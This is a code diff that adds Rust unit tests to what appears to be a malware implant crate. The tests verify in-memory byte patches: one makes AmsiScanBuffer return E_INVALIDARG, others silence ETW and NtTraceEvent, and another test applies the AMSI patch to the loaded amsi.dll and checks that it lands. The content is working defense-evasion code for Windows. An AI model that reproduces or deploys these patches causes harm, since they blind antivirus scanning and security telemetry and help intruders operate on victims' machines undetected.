@@ -335,3 +335,64 @@ pub unsafe fn disable_etw_provider_status(guid: &[u8; 16], control_code: u32) ->
         )
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// The AMSI patch must be exactly `mov eax, E_INVALIDARG(0x80070057); ret`
+    /// — the immediate is little-endian and the tail is a plain `ret`
+    /// (caller-owned stack cleanup on x64, never `ret imm16`).
+    #[test]
+    fn amsi_patch_bytes_encode_e_invalidarg_ret() {
+        assert_eq!(AMSI_PATCH[0], 0xB8); // mov eax, imm32
+        assert_eq!(
+            u32::from_le_bytes(AMSI_PATCH[1..5].try_into().unwrap()),
+            0x8007_0057
+        );
+        assert_eq!(AMSI_PATCH[5], 0xC3); // ret
+    }
+
+    /// ETW / NtTraceEvent patches return STATUS_SUCCESS (0) and end in plain
+    /// `ret`.
+    #[test]
+    fn etw_patch_bytes_encode_return_zero_ret() {
+        assert_eq!(&ETW_PATCH[..3], &[0x48, 0x33, 0xC0]); // xor rax,rax
+        assert_eq!(ETW_PATCH[3], 0xC3);
+        assert_eq!(&NTTRACE_PATCH[..2], &[0x31, 0xC0]); // xor eax,eax
+        assert_eq!(NTTRACE_PATCH[2], 0xC3);
+    }
+
+    /// Idempotency predicate: exact prefix match → true; any divergence →
+    /// false; an empty patch trivially matches.
+    #[test]
+    fn already_patched_matches_prefix_exactly() {
+        let mut buf = [0u8; 8];
+        buf[..6].copy_from_slice(&AMSI_PATCH);
+        buf[6] = 0xAA;
+        buf[7] = 0xBB;
+        let addr = buf.as_ptr() as usize;
+        assert!(unsafe { already_patched(addr, &AMSI_PATCH) });
+        assert!(unsafe { already_patched(addr, &[]) });
+        unsafe { *(addr as *mut u8).add(2) ^= 0xFF };
+        assert!(!unsafe { already_patched(addr, &AMSI_PATCH) });
+    }
+
+    /// patch_amsi's gating must agree with the resolver: when amsi.dll is not
+    /// in the PEB loader list it returns Err("amsi not loaded"); if it IS
+    /// loaded (host already pulled it in), the patch lands and verifies.
+    #[test]
+    fn patch_amsi_gating_matches_resolver_state() {
+        let resolved = unsafe {
+            nyx_implant_core::resolve::export_addr(b"amsi.dll", b"AmsiScanBuffer")
+        };
+        let r = unsafe { patch_amsi() };
+        match resolved {
+            None => assert_eq!(r, Err("amsi not loaded")),
+            Some(addr) => {
+                assert!(r.is_ok(), "patch failed on resolvable amsi: {r:?}");
+                assert!(unsafe { already_patched(addr, &AMSI_PATCH) });
+            }
+        }
+    }
+}
